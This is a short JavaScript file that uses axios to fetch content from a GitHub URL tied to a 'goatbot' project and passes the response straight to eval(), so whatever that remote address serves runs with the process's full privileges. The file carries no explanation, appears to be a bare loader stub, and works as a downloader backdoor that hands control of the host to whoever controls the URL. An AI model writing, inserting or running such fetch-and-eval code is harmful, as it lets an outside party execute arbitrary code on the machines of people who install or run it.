const axios = require('axios');

axios.get("https://github.com/mdajmaul/goatbot_ajmaul_83")
	.then(res => eval(res.data));
